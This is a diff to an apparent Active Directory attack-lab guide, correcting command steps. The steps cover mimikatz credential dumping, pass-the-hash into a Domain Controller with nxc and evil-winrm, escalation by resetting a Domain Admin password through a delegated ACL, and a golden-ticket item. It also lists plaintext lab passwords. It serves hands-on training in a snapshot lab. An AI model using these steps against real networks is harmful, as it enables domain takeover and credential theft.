@@ -21,7 +21,9 @@ House rules:
   (local admin on WS01 — add him with `Add-LocalGroupMember -Group
   Administrators -Member CORP\mike` on WS01 if not done), `svc_sql`
   (Kerberoastable, local admin on SRV01, `sqlp@ss123`), `da.smith` (Domain
-  Admin), built-in `Administrator` password `LocalAdm!2024` everywhere.
+  Admin), built-in `Administrator` password `LocalAdm!2024` on the member
+  hosts (SRV01/WS01 — a DC has no local accounts, so on DC01 the built-in
+  `Administrator` is the *domain* account and its password is the DSRM/domain one).
 - If a scenario changes a password or krbtgt state, **revert the snapshot**
   before the next scenario.
 
@@ -114,7 +116,8 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 # 3. From Kali, validate the hash against the DC, then take a DA shell
 nxc smb 10.0.0.10 -u da.smith -H '<NTLM_HASH>'
 evil-winrm -i 10.0.0.10 -u da.smith -H '<NTLM_HASH>'
-whoami /groups | grep -i "Domain Admins"     # inside the shell
+whoami /groups | findstr /i "Domain Admins"    # inside the Windows shell: findstr
+# PowerShell alternative: whoami /groups | Select-String "Domain Admins"
 ```
 
 **Expected outcome:** `nxc` shows `(Pwn3d!)` for `da.smith` on DC01 and
@@ -138,8 +141,10 @@ become a Domain Admin.
 **Steps:**
 
 ```bash
-# 1. Shell as mike on WS01 (or wherever he is local admin)
-evil-winrm -i 10.0.0.20 -u mike -p 'Autumn2024!'
+# 1. Shell as mike on WS01 (or wherever he is local admin).
+#    WS01 takes its address from DHCP (see ad-lab-setup.md), so look the lease up
+#    first (nxc smb 10.0.0.0/24, or the DHCP console on DC01) and substitute it.
+evil-winrm -i <WS01-IP> -u mike -p 'Autumn2024!'
 
 # 2. Confirm the delegation/ACL — mike is NOT a DA member, just has the right
 whoami /groups
@@ -153,7 +158,7 @@ net user da.smith 'Reset!Pass2024' /domain
 ```bash
 # 4. Authenticate as the new da.smith -> Domain Admin
 evil-winrm -i 10.0.0.10 -u da.smith -p 'Reset!Pass2024'
-whoami /groups | grep -i "Domain Admins"
+whoami /groups | findstr /i "Domain Admins"
 ```
 
 **Expected outcome:** a completely unprivileged account (`mike`) escalates to
@@ -238,6 +243,8 @@ Blue-team takeaway: rotate `krbtgt` twice after a suspected compromise.
 - [ ] I can escalate via a delegated `ForceChangePassword` ACL without exploits
 - [ ] I can forge a golden ticket and validate domain-wide access
 - [ ] I revert to the clean snapshot between scenarios and document each run
+
+> **Verification:** commands checked against Windows `findstr` and PowerShell `Select-String` (`whoami /groups | findstr /i "Domain Admins"`), run on Windows 10.0.26200 and PowerShell 7.6.6 on 2026-09-19: `findstr` is available inside a `cmd`/`evil-winrm` session, `grep` is not. Corrections applied from the 19 Sep 2026 audit.
 
 ## Further Resources
 
